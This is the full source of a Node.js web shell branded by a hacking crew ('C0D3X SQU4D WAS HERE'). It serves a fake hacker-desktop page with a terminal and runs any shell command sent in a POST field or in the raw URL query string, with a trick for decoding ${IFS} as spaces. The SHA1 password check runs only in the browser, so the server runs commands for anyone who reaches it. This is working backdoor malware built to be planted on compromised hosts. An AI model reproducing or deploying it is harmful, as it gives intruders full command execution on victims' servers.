const express = require('express');
const { exec } = require('child_process');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// SHA1 hash ng password
const PASSWORD_HASH = "49d667fdd3d98a6b818ab8c1a9183e3eff2626a2";

function executeCommand(cmd) {
    return new Promise((resolve) => {
        exec(cmd + ' 2>&1', { timeout: 30000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
            const output = stdout || stderr || '';
            resolve(output);
        });
    });
}

const SILENT_COMMANDS = ['mv', 'cp', 'rm', 'chmod', 'chown', 'chgrp', 
                         'mkdir', 'rmdir', 'touch', 'ln', 'mount', 'umount', 
                         'kill', 'pkill'];
const RECURSIVE_COMMANDS = ['wget', 'curl'];

function processOutput(cmd, output) {
    if (output && output.trim() !== '') return output;
    const parts = cmd.trim().split(' ');
    const baseCmd = parts[0];
    if (SILENT_COMMANDS.includes(baseCmd)) {
        return '❖ Command Executed Successfully';
    }
    if (RECURSIVE_COMMANDS.includes(baseCmd)) {
        const recursiveFlags = ['-r', '--recursive', '-R', '-np', '-l'];
        if (recursiveFlags.some(flag => cmd.includes(flag))) {
            return '❖ Recursive Download Completed Successfully';
        }
        return '❖ Download Completed Successfully';
    }
    return '';
}

app.post('/', async (req, res) => {
    if (req.body.cmd) {
        const cmd = req.body.cmd.trim();
        let output = await executeCommand(cmd);
        output = processOutput(cmd, output);
        res.type('text/plain').send(output);
        return;
    }
    res.send(getHTML(''));
});

app.get('/', async (req, res) => {
    const rawCmd = req.url.split('?')[1] || '';
    let output = '';
    let lastCommand = '';
    if (rawCmd) {
        lastCommand = decodeURIComponent(rawCmd);
        lastCommand = lastCommand.replace(/\$\{IFS\}/g, ' ');
        lastCommand = lastCommand.trim();
        if (lastCommand) {
            output = await executeCommand(lastCommand);
            output = processOutput(lastCommand, output);
        }
    }
    res.send(getHTML(output));
});

function getHTML(output) {
    const displayOutput = output
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/\n/g, '<br>');
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C0D3X SQU4D WAS HERE</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0a0e27; min-height: 100vh; overflow: hidden; }
.login-page { position: fixed; inset: 0; z-index: 1000; display: flex; justify-content: center; align-items: center; }
.login-bg { position: absolute; inset: 0; background: #0a0e27; overflow: hidden; }
#loginBinaryCanvas { position: absolute; inset: 0; width: 100%; height: 100%; opacity: 0.55; }
.login-blur { position: absolute; inset: 0; backdrop-filter: blur(3px); background: rgba(10,14,39,0.2); z-index: 1; }
.login-container { position: relative; z-index: 2; text-align: center; }
.login-logo img { width: 150px; filter: drop-shadow(0 0 10px rgba(0,170,0,0.6)); }
.login-box { width: 240px; margin: 0 auto; }
.wrapper { position: relative; }
.wrapper input { background: rgba(10,10,10,0.85); color: #00ff00; border: 1px solid #00ff00; padding: 8px 35px 8px 12px; font-family: monospace; font-size: 12px; width: 100%; border-radius: 4px; outline: none; height: 34px; }
.wrapper span { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #00ff00; }
.login-btn { background: #00aa00; color: #000; border: none; padding: 6px 18px; cursor: pointer; font-weight: bold; font-family: monospace; font-size: 11px; border-radius: 4px; margin-top: 12px; }
.login-btn:hover { background: #00ff00; }
.error { color: #ff6666; margin-top: 8px; font-size: 10px; }
.interface { position: fixed; inset: 0; display: none; }
.desktop { position: absolute; inset: 0; background: linear-gradient(135deg, #0a0e27, #0a1220); overflow-y: auto; }
#desktopBinaryCanvas { position: fixed; inset: 0; pointer-events: none; z-index: 1; opacity: 0.5; }
.bg-logo { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); width: 340px; max-width: 35vw; z-index: 2; pointer-events: none; opacity: 0.45; }
.bg-logo img { width: 100%; }
.desktop-apps { position: absolute; left: 15px; top: 15px; bottom: 50px; z-index: 10; display: flex; gap: 12px; }
.app-column { display: flex; flex-direction: column; gap: 6px; }
.app-icon { display: flex; flex-direction: column; align-items: center; background: rgba(0,0,0,0.5); border-radius: 6px; padding: 6px 8px; cursor: pointer; text-decoration: none; min-width: 60px; }
.app-icon:hover { background: rgba(0,170,0,0.5); }
.app-icon-logo i { font-size: 18px; color: #00ff00; }
.app-name { color: #00ff00; font-family: monospace; font-size: 7px; font-weight: bold; }
.bottom-taskbar { position: fixed; bottom: 0; left: 0; right: 0; height: 40px; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: flex; align-items: center; padding: 0 12px; gap: 8px; z-index: 20; border-top: 1px solid #1a4a1a; }
.taskbar-btn { background: rgba(255,255,255,0.1); border: none; border-radius: 6px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
.taskbar-btn:hover { background: #00ff00; }
.taskbar-btn:hover .btn-icon { color: #000; }
.btn-icon { color: #00ff00; font-size: 18px; font-weight: bold; }
.taskbar-clock { margin-left: auto; text-align: right; }
.clock-time { color: #00ff00; font-family: 'Courier New', monospace; font-size: 18px; font-weight: bold; letter-spacing: 2px; }
.clock-date { color: #00ff00; font-family: monospace; font-size: 9px; font-weight: bold; }
.main-menu-nav { position: fixed; left: 0; top: 0; bottom: 0; width: 250px; background: #0a0a0a; border-right: 1px solid #00ff00; z-index: 30; transform: translateX(-100%); transition: transform 0.3s; display: flex; flex-direction: column; }
.main-menu-nav.show { transform: translateX(0); }
.menu-header { padding: 20px 15px 12px; border-bottom: 1px solid #00ff00; text-align: center; }
.menu-logo img { width: 100px; }
.menu-credit { color: #2a8a2a; font-family: monospace; font-size: 9px; margin-top: 10px; }
.menu-items { flex: 1; padding: 15px 0; }
.menu-item { padding: 12px 20px; color: #00ff00; font-family: monospace; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 12px; }
.menu-item:hover { background: #00ff00; color: #000; }
.menu-footer { padding: 12px; border-top: 1px solid #1a3a1a; text-align: center; }
.menu-footer span { color: #2a6a2a; font-size: 9px; }
.menu-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 25; display: none; }
.menu-overlay.show { display: block; }
.terminal-container { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); width: 3.7in; height: 2.3in; background: #0a0a0a; border: 1px solid #00ff00; border-radius: 8px; overflow: hidden; display: none; flex-direction: column; box-shadow: 0 0 25px rgba(0,255,0,0.3); z-index: 200; }
.terminal-container.maximized { position: fixed; top: 0; left: 0; right: 0; bottom: 40px; width: auto; height: auto; transform: none; border-radius: 0; }
.title-bar { background: #1a1a2e; display: flex; justify-content: space-between; align-items: center; padding: 4px 10px; border-bottom: 1px solid #00ff00; }
.loading-dots { display: flex; gap: 5px; }
.dot { width: 7px; height: 7px; border-radius: 50%; animation: bounce 1s infinite; }
.dot-red { background: #ff4444; }
.dot-yellow { background: #ffcc00; animation-delay: 0.2s; }
.dot-green { background: #44ff44; animation-delay: 0.4s; }
@keyframes bounce { 0%,100% { transform: translateY(0); opacity: 0.5; } 50% { transform: translateY(-3px); opacity: 1; } }
.win-btn { background: transparent; border: 1px solid #00ff00; color: #00ff00; cursor: pointer; font-family: monospace; border-radius: 3px; width: 20px; height: 20px; font-size: 11px; }
.win-btn:hover { background: #00ff00; color: #000; }
.terminal-header { background: #0a0a0a; padding: 8px 12px 0; display: flex; gap: 12px; align-items: flex-start; }
.terminal-header-logo img { width: 55px; }
.os-name { color: #00ff00; font-family: monospace; font-size: 13px; font-weight: bold; letter-spacing: 2px; }
.os-desc { color: #2a8a2a; font-family: monospace; font-size: 8px; margin-top: 2px; }
.os-version { color: #1a6a1a; font-family: monospace; font-size: 7px; margin-top: 2px; }
.prompt-container { background: #0a0a0a; padding: 4px 12px 0; }
.prompt-line1 { color: #00ff00; font-family: 'Courier New', monospace; white-space: pre; line-height: 1.3; font-size: 10px; }
.prompt-line2 { color: #00ff00; font-family: 'Courier New', monospace; white-space: pre; line-height: 1.3; display: flex; align-items: center; font-size: 10px; }
.cmd-input { background: transparent; color: #00ff00; border: none; font-family: 'Courier New', monospace; outline: none; flex: 1; font-size: 10px; caret-color: #00ff00; }
.output-area { background: #0a0a0a; padding: 3px 12px 6px; flex: 1; overflow: auto; }
.output-pre { color: #00ff00; font-family: 'Courier New', monospace; white-space: pre-wrap; word-wrap: break-word; line-height: 1.3; font-size: 9px; }
.footer { text-align: center; padding: 3px; color: #2a6a2a; border-top: 1px solid #1a3a1a; background: #0a0a0a; font-size: 7px; }
</style>
</head>
<body>
<div id="loginPage" class="login-page">
    <div class="login-bg"><canvas id="loginBinaryCanvas"></canvas></div>
    <div class="login-blur"></div>
    <div class="login-container">
        <div class="login-logo"><img src="https://i.ibb.co/9mT4TvjH/1779715471064.png"></div>
        <div class="login-box">
            <div class="wrapper">
                <input type="password" placeholder="Password" id="password" onkeypress="enterKey(event)">
                <span><i class="fa fa-eye" id="eye" onclick="togglePassword()"></i></span>
            </div>
            <button class="login-btn" onclick="checkLogin()">LOGIN</button>
            <div id="errorMsg" class="error"></div>
        </div>
    </div>
</div>
<div id="interface" class="interface">
    <div class="desktop">
        <canvas id="desktopBinaryCanvas"></canvas>
        <div class="bg-logo"><img src="https://i.ibb.co/9mT4TvjH/1779715471064.png"></div>
        <div class="desktop-apps">
            <div class="app-column">
                <a class="app-icon" href="https://www.google.com/chrome/" target="_blank"><div class="app-icon-logo"><i class="fab fa-chrome"></i></div><span class="app-name">Chrome</span></a>
                <a class="app-icon" href="https://www.youtube.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-youtube"></i></div><span class="app-name">YouTube</span></a>
                <a class="app-icon" href="https://web.telegram.org/" target="_blank"><div class="app-icon-logo"><i class="fab fa-telegram-plane"></i></div><span class="app-name">Telegram</span></a>
                <a class="app-icon" href="https://www.facebook.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-facebook-f"></i></div><span class="app-name">Facebook</span></a>
                <a class="app-icon" href="https://www.instagram.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-instagram"></i></div><span class="app-name">Instagram</span></a>
                <a class="app-icon" href="https://github.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-github"></i></div><span class="app-name">GitHub</span></a>
                <a class="app-icon" href="https://twitter.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-twitter"></i></div><span class="app-name">Twitter</span></a>
                <a class="app-icon" href="https://discord.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-discord"></i></div><span class="app-name">Discord</span></a>
            </div>
            <div class="app-column">
                <a class="app-icon" href="https://www.spotify.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-spotify"></i></div><span class="app-name">Spotify</span></a>
                <a class="app-icon" href="https://www.netflix.com/" target="_blank"><div class="app-icon-logo"><i class="fas fa-film"></i></div><span class="app-name">Netflix</span></a>
                <a class="app-icon" href="https://mail.google.com/" target="_blank"><div class="app-icon-logo"><i class="fas fa-envelope"></i></div><span class="app-name">Gmail</span></a>
                <a class="app-icon" href="https://www.reddit.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-reddit-alien"></i></div><span class="app-name">Reddit</span></a>
                <a class="app-icon" href="https://www.twitch.tv/" target="_blank"><div class="app-icon-logo"><i class="fab fa-twitch"></i></div><span class="app-name">Twitch</span></a>
                <a class="app-icon" href="https://web.whatsapp.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-whatsapp"></i></div><span class="app-name">WhatsApp</span></a>
                <a class="app-icon" href="https://www.tiktok.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-tiktok"></i></div><span class="app-name">TikTok</span></a>
                <a class="app-icon" href="https://www.linkedin.com/" target="_blank"><div class="app-icon-logo"><i class="fab fa-linkedin-in"></i></div><span class="app-name">LinkedIn</span></a>
            </div>
        </div>
    </div>
    <div class="bottom-taskbar">
        <div class="taskbar-btn" onclick="toggleMainMenu()"><span class="btn-icon">⊞</span></div>
        <div class="taskbar-btn" onclick="showTerminal()"><span class="btn-icon">>_</span></div>
        <div class="taskbar-clock">
            <div class="clock-time" id="clockTime">--:--:--</div>
            <div class="clock-date" id="clockDate">--</div>
        </div>
    </div>
</div>
<div id="mainMenuNav" class="main-menu-nav">
    <div class="menu-header"><div class="menu-logo"><img src="https://i.ibb.co/9mT4TvjH/1779715471064.png"></div><div class="menu-credit">Created by: 0xCodex</div></div>
    <div class="menu-items">
        <div class="menu-item" onclick="menuRestart()"><span><i class="fas fa-undo"></i></span><span>RESTART</span></div>
        <div class="menu-item" onclick="menuRefresh()"><span><i class="fas fa-sync-alt"></i></span><span>REFRESH</span></div>
        <div class="menu-item" onclick="menuShutdown()"><span><i class="fas fa-power-off"></i></span><span>SHUTDOWN</span></div>
    </div>
    <div class="menu-footer"><span>C0D3X SQU4D WAS HERE</span></div>
</div>
<div id="menuOverlay" class="menu-overlay" onclick="closeMainMenu()"></div>
<div id="terminalBox" class="terminal-container">
    <div class="title-bar"><div class="loading-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div><div><button class="win-btn" onclick="minimizeTerminal()">─</button><button class="win-btn" onclick="maximizeTerminal()">□</button><button class="win-btn" onclick="closeTerminal()">✕</button></div></div>
    <div class="terminal-header"><div class="terminal-header-logo"><img src="https://i.ibb.co/9mT4TvjH/1779715471064.png"></div><div><div class="os-name">ANDRAX MOBILE</div><div class="os-desc">Advanced Penetration Testing Framework</div><div class="os-version">Release: v4.0.2 | Build: 2024.03.15</div></div></div>
    <div class="prompt-container"><div class="prompt-line1">╭─[-][root@andrax][-]</div><div class="prompt-line2"><span>╰─➤ $ </span><input type="text" id="cmdInput" class="cmd-input" autocomplete="off" onkeypress="executeCommand(event)"></div></div>
    <div class="output-area"><pre id="outputPre" class="output-pre">${displayOutput}</pre></div>
    <div class="footer">© All Right Reserve 2024 | Codex Squad Penetrators</div>
</div>
<script>
function sha1(str) {
    function rl(n, b) { return (n << b) | (n >>> (32 - b)); }
    function th(n) { var s = "", v; for (var i = 7; i >= 0; i--) { v = (n >>> (i * 4)) & 0x0f; s += v.toString(16); } return s; }
    var W = new Array(80);
    var H0 = 0x67452301, H1 = 0xEFCDAB89, H2 = 0x98BADCFE, H3 = 0x10325476, H4 = 0xC3D2E1F0;
    var A, B, C, D, E, temp, i;
    str = unescape(encodeURIComponent(str));
    var sl = str.length;
    var wa = [];
    for (i = 0; i < sl - 3; i += 4) { wa.push(str.charCodeAt(i) << 24 | str.charCodeAt(i+1) << 16 | str.charCodeAt(i+2) << 8 | str.charCodeAt(i+3)); }
    switch (sl % 4) {
        case 0: i = 0x080000000; break;
        case 1: i = str.charCodeAt(sl-1) << 24 | 0x0800000; break;
        case 2: i = str.charCodeAt(sl-2) << 24 | str.charCodeAt(sl-1) << 16 | 0x08000; break;
        case 3: i = str.charCodeAt(sl-3) << 24 | str.charCodeAt(sl-2) << 16 | str.charCodeAt(sl-1) << 8 | 0x80; break;
    }
    wa.push(i);
    while ((wa.length % 16) != 14) wa.push(0);
    wa.push(sl >>> 29);
    wa.push((sl << 3) & 0x0ffffffff);
    for (var bs = 0; bs < wa.length; bs += 16) {
        for (i = 0; i < 16; i++) W[i] = wa[bs + i];
        for (i = 16; i <= 79; i++) W[i] = rl(W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1);
        A = H0; B = H1; C = H2; D = H3; E = H4;
        for (i = 0; i <= 19; i++) { temp = (rl(A,5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff; E=D; D=C; C=rl(B,30); B=A; A=temp; }
        for (i = 20; i <= 39; i++) { temp = (rl(A,5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff; E=D; D=C; C=rl(B,30); B=A; A=temp; }
        for (i = 40; i <= 59; i++) { temp = (rl(A,5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff; E=D; D=C; C=rl(B,30); B=A; A=temp; }
        for (i = 60; i <= 79; i++) { temp = (rl(A,5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff; E=D; D=C; C=rl(B,30); B=A; A=temp; }
        H0 = (H0 + A) & 0x0ffffffff; H1 = (H1 + B) & 0x0ffffffff; H2 = (H2 + C) & 0x0ffffffff; H3 = (H3 + D) & 0x0ffffffff; H4 = (H4 + E) & 0x0ffffffff;
    }
    return (th(H0) + th(H1) + th(H2) + th(H3) + th(H4)).toLowerCase();
}
var _0x4a2b = "49d667fdd3d98a6b818ab8c1a9183e3eff2626a2";
function togglePassword() {
    var p = document.getElementById('password');
    var e = document.getElementById('eye');
    if (p.type === 'password') { p.type = 'text'; e.classList.remove('fa-eye'); e.classList.add('fa-eye-slash'); }
    else { p.type = 'password'; e.classList.remove('fa-eye-slash'); e.classList.add('fa-eye'); }
}
function checkLogin() {
    if (sha1(document.getElementById('password').value) === _0x4a2b) {
        if (loginBinary) loginBinary.stop();
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('interface').style.display = 'block';
        if (desktopBinary) desktopBinary.start();
        updateRealTimeClock();
        setInterval(updateRealTimeClock, 1000);
    } else {
        document.getElementById('errorMsg').innerHTML = 'ACCESS DENIED!';
    }
}
function enterKey(e) { if (e.key === 'Enter') checkLogin(); }
function updateRealTimeClock() {
    var n = new Date();
    document.getElementById('clockTime').innerHTML = String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0')+':'+String(n.getSeconds()).padStart(2,'0');
    var d = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
    var m = ['January','February','March','April','May','June','July','August','September','October','November','December'];
    document.getElementById('clockDate').innerHTML = d[n.getDay()]+', '+m[n.getMonth()]+' '+n.getDate()+', '+n.getFullYear();
}
function saveState() { sessionStorage.setItem('tm', document.getElementById('terminalBox').classList.contains('maximized')); }
function loadState() { if (sessionStorage.getItem('tm') === 'true') document.getElementById('terminalBox').classList.add('maximized'); else document.getElementById('terminalBox').classList.remove('maximized'); }
function executeCommand(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        var cmd = document.getElementById('cmdInput').value;
        if (cmd.trim() !== '') {
            var o = document.getElementById('outputPre');
            o.innerHTML = '❖ Please Wait Responding...';
            fetch(window.location.pathname, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest' },
                body: 'cmd=' + encodeURIComponent(cmd)
            }).then(r => r.text()).then(d => { o.innerHTML = d.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); })
            .catch(er => { o.innerHTML = '[ERROR] ' + er.message; });
            document.getElementById('cmdInput').value = '';
        }
    }
}
function toggleMainMenu() { document.getElementById('mainMenuNav').classList.toggle('show'); document.getElementById('menuOverlay').classList.toggle('show'); }
function closeMainMenu() { document.getElementById('mainMenuNav').classList.remove('show'); document.getElementById('menuOverlay').classList.remove('show'); }
function menuRestart() {
    if (desktopBinary) desktopBinary.stop();
    document.getElementById('interface').style.display = 'none';
    document.getElementById('loginPage').style.display = 'flex';
    document.getElementById('password').value = '';
    document.getElementById('errorMsg').innerHTML = '';
    var t = document.getElementById('terminalBox');
    t.style.display = 'none';
    t.classList.remove('maximized');
    document.getElementById('outputPre').innerHTML = '';
    closeMainMenu();
    if (loginBinary) loginBinary.start();
}
function menuRefresh() { location.reload(); }
function menuShutdown() { menuRestart(); }
function showTerminal() {
    document.getElementById('terminalBox').style.display = 'flex';
    loadState();
    setTimeout(function() { document.getElementById('cmdInput').focus(); }, 100);
    closeMainMenu();
}
function hideTerminal() { document.getElementById('terminalBox').style.display = 'none'; saveState(); }
function minimizeTerminal() { hideTerminal(); }
function maximizeTerminal() {
    var t = document.getElementById('terminalBox');
    t.classList.toggle('maximized');
    saveState();
    setTimeout(function() { document.getElementById('cmdInput').focus(); }, 100);
}
function closeTerminal() {
    document.getElementById('outputPre').innerHTML = '';
    document.getElementById('cmdInput').value = '';
    hideTerminal();
}
class SlowMatrixRain {
    constructor(id, op) {
        this.canvas = document.getElementById(id);
        if (!this.canvas) return;
        this.ctx = this.canvas.getContext('2d');
        this.opacity = op;
        this.chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{};:?/<>";
        this.fontSize = 16;
        this.speed = 0.28;
        this.init();
    }
    init() { this.resize(); window.addEventListener('resize', () => this.resize()); this.start(); }
    resize() {
        this.canvas.width = window.innerWidth;
        this.canvas.height = window.innerHeight;
        this.columns = Math.floor(this.canvas.width / this.fontSize);
        this.drops = [];
        for (let i = 0; i < this.columns; i++) this.drops[i] = Math.random() * -120;
    }
    start() { if (this.animationId) return; this.animate(); }
    stop() { if (this.animationId) { cancelAnimationFrame(this.animationId); this.animationId = null; } if (this.ctx) this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height); }
    animate() {
        if (!this.ctx) return;
        this.ctx.fillStyle = 'rgba(10,14,39,0.03)';
        this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
        this.ctx.font = this.fontSize + "px 'Courier New', monospace";
        for (let i = 0; i < this.drops.length; i++) {
            const c = this.chars[Math.floor(Math.random() * this.chars.length)];
            const x = i * this.fontSize;
            const y = this.drops[i] * this.fontSize;
            const b = 0.6 + Math.random() * 0.4;
            this.ctx.fillStyle = 'rgba(80,255,80,' + (this.opacity * b) + ')';
            this.ctx.fillText(c, x, y);
            if (y > this.canvas.height && Math.random() > 0.99) this.drops[i] = 0;
            this.drops[i] += this.speed;
        }
        this.animationId = requestAnimationFrame(() => this.animate());
    }
}
let loginBinary = null, desktopBinary = null;
window.onload = function() {
    loginBinary = new SlowMatrixRain('loginBinaryCanvas', 0.55);
    desktopBinary = new SlowMatrixRain('desktopBinaryCanvas', 0.5);
    desktopBinary.stop();
    if (window.location.search !== '') {
        if (loginBinary) loginBinary.stop();
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('interface').style.display = 'block';
        desktopBinary.start();
        updateRealTimeClock();
        setInterval(updateRealTimeClock, 1000);
        document.getElementById('terminalBox').style.display = 'flex';
        loadState();
        document.getElementById('cmdInput').focus();
    }
}
</script>
</body>
</html>`;
}

app.listen(PORT, () => console.log('Codex server running on port ' + PORT));
